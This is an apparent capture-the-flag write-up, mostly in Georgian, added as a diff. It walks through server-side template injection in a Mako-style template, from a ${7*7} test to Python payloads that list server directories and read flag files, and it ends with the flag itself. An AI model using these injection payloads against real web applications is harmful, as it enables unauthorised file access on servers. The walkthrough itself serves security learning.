@@ -1,0 +1,6 @@
+step 1: ჩავწეროთ shark საიტში ყველაფერი - ${7*7} და ვნახავთ რომ 49 გამოდის ანუ Mako-style syntax წააგავს
+step 2:${open('/flag.txt').read()} ამით გვანახებს რომ ssti მუსჰაობს
+step 3: ${__import__('os').listdir('/')} ვხედავt root and home 
+step 4:${__import__('os').listdir('/home')} ვიპოვეთ ctf
+step 5: ${__import__('os').listdir('/home/ctf')} და ვხედავთ flag
+step 6:${open('/home/ctf/flag').read()} და მივიღებთ ფლაგს Hello CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58} !
